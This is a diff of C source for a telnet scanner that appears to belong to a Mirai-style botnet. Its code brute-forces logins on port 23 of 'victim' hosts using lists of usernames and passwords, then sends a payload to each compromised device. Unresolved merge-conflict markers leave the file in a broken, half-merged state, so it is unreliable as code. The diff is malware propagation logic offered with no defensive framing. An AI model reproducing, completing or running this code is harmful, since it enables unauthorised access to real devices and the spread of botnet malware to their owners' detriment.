@@ -98,7 +98,7 @@ bool scan_negotiate(int sock, unsigned char *buf, int len) {
 	return true;
 }
 
-bool scan_readuntil(const int32_t sock, const char **strs)
+uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
 {
 	int16_t i = 0, maxlen = -1, minlen = -1;
 	unsigned char *buf = NULL;
@@ -111,17 +111,26 @@ bool scan_readuntil(const int32_t sock, const char **strs)
 		if (_len < minlen)
 			minlen = _len;
 	}
+	while (*strs2)
+	{
+		int16_t _len = strlen(*strs2++);
+		if (_len > maxlen)
+			maxlen = _len;
+		if (_len < minlen)
+			minlen = _len;
+	}
+
 	unsigned char mbuf[maxlen + 100];
 
 	while (1)
 	{
 		if (recv(sock, buf, 1, 0) < 0) // Read 1 from socket
-			return false;
+			return 0;
 		if (*buf == TELNET_CMD)
 		{
 			uint8_t longbuf[4];
 			if (recv(sock, longbuf, 3, 0) <= 0)
-				return false;
+				return 0;
 			scan_negotiate(sock, longbuf, 3);
 		}
 		else
@@ -133,12 +142,17 @@ bool scan_readuntil(const int32_t sock, const char **strs)
 			while (*strs)
 			{
 				if (subcasestr((const char *)mbuf, *strs++) != -1)
-					return true;
+					return 1;
+			}
+			while (*strs2)
+			{
+				if (subcasestr((const char *)mbuf, *strs2++) != -1)
+					return 2;
 			}
 		}
 		i++;
 	}
-	return false;
+	return 0;
 }
 
 bool scan_scanner(void)
@@ -306,6 +320,7 @@ bool scan_scanner(void)
 					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr))
 }
 #endif
+<<<<<<< HEAD
 					struct scan_victim *victim;
 					victim = &victim_table[i];
 					victim->ip = riph->saddr;
@@ -324,6 +339,25 @@ bool scan_scanner(void)
 			addrx.sin_family = AF_INET;
 			addrx.sin_port = htons(23);
 			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
+=======
+				struct scan_victim *victim;
+				victim = &victim_table[i];
+				victim->ip = riph->saddr;
+				victim->user = 0;
+				victim->pass = 0;
+				victim->tries = 0;
+				if (i++ >= SCAN_SCANNER_MAXCON)
+					break;
+			}
+		}
+	}
+	while (1)
+	{
+		struct sockaddr_in addrx;
+		addrx.sin_family = AF_INET;
+		addrx.sin_port = htons(23);
+		memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
+>>>>>>> origin/master
 
 			struct timeval timeout;
 			timeout.tv_sec = SCAN_SCANNER_SEC;
@@ -356,8 +390,33 @@ bool scan_scanner(void)
 					} 
 					case USERNAME:
 					{
+<<<<<<< HEAD
 						/*
 						Need to make this readuntil accept more than one string
+=======
+						victim_table[i].state = FINISHED;
+					}
+					else
+					{
+						victim_table[i].state = USERNAME;
+					}
+					break;
+				} 
+				case USERNAME:
+				{
+					uint8_t ret = scan_readuntil(victim_table[i].sock, userprompts, prompts);
+
+					switch (ret)
+					{
+						case 0:
+							victim_table[i].state = FINISHED;
+							break;
+						case 1:
+							break;
+						case 2:
+							victim_table[i].state = PAYLOAD;
+					}
+>>>>>>> origin/master
 
 						so I can do const userwords[] {
 							"login",
@@ -368,6 +427,7 @@ bool scan_scanner(void)
 						if (scan_readuntil(victim_table[i].sock, userprompts) == false)
 							victim_table[i].state = FINISHED;
 
+<<<<<<< HEAD
 						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
 						{
 							victim_table[i].state = FINISHED;
@@ -377,10 +437,49 @@ bool scan_scanner(void)
 						if (scan_readuntil(victim_table[i].sock, failstrs) == true)
 						{
 							if (victim_table[i].user++ >= usersize)
-							{
+=======
+					uint8_t ret = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
+					switch (ret)
+					{
+						case 0:
+							victim_table[i].state = FINISHED;
+							break;
+						case 1:
+							if (victim_table[i].user++ >= usersize)
 								victim_table[i].state = FINISHED;
-								break;
+							break;
+						case 2:
+							victim_table[i].state = PASSWORD;
+							break;
+					}
+					break;
+				}
+				case PASSWORD:
+				{
+
+					if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
+					{
+						victim_table[i].state = FINISHED;
+						break;
+					}
+
+					uint8_t ret = scan_readuntil(victim_table[i].sock, failstrs, prompts);
+					switch (ret)
+					{
+						case 0:
+							victim_table[i].state = FINISHED;
+							break;
+						case 1:
+							if (victim_table[i].pass++ >= passsize)
+>>>>>>> origin/master
+							{
+								victim_table[i].pass = 0;
+								if (victim_table[i].user++ >= usersize)
+									victim_table[i].state = FINISHED;
+								else
+									victim_table[i].state = USERNAME;
 							}
+<<<<<<< HEAD
 						}
 						else
 							victim_table[i].state = PASSWORD;
@@ -429,6 +528,25 @@ bool scan_scanner(void)
 					{
 						break;
 					}
+=======
+							break;
+						case 2:
+							victim_table[i].state = PAYLOAD;
+					}
+					break;
+				}
+				case PAYLOAD:
+				{
+					// I know this look stupid for now but I'll clean it up later
+					if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
+						victim_table[i].state = FINISHED;
+					victim_table[i].state = FINISHED;
+					break;
+				}
+				case FINISHED:
+				{
+					break;
+>>>>>>> origin/master
 				}
 			}
 		}
